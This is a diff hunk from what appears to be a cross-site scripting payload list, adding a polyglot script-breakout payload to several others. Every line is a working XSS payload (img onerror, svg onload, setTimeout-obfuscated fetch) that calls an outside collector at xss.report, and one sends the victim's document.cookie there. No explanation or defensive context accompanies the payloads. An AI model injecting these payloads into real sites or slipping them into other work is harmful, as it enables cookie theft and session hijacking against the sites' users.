@@ -6,3 +6,4 @@ javascript://</script></textarea></style></noscript></noembed></script></templat
 <img src=x onerror=fetch('https://xss.report/c/hnterx?c='+document.cookie)>
 '"<svg/onload="fetch('https://xss.report/c/hnterx'">
 '"<svg/onload='var a="fetch";var b="https://xss.report/c/hnterx"; setTimeout(a+"(b)",1000)'>
+'"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/hnterx")></script>
